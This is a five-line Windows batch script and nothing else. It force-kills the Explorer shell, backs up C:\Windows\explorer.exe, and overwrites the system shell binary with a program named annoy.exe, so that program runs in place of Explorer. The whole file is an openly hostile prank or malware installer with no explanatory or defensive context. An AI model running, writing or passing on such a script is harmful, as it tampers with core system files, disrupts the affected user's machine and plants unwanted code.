@echo off
taskkill /f /im explorer.exe
copy C:\Windows\explorer.exe C:\Windows\explorer.bak
copy annoy.exe C:\Windows\explorer.exe
exit
